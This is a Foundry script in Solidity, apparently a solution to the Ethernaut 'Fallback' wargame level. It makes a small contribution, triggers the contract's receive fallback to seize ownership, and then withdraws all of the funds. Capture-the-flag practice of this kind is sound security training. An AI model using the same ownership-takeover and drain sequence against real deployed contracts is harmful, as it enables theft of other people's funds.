// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "forge-std/Script.sol";
import "../../src/fallback/Fallback.sol";

contract FallbackAttack is Script {

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployer);

        address levelAddress = 0xF4b006338251D553180941bac54FFd4D676EFEdF;
        Fallback level = Fallback(payable(levelAddress));
        level.contribute{value: 1 wei}();

        (bool success, ) = address(level).call{value: 1 wei}("");
        require(success, "Failed to send ETH");
        level.withdraw();

        vm.stopBroadcast();

        
    }
}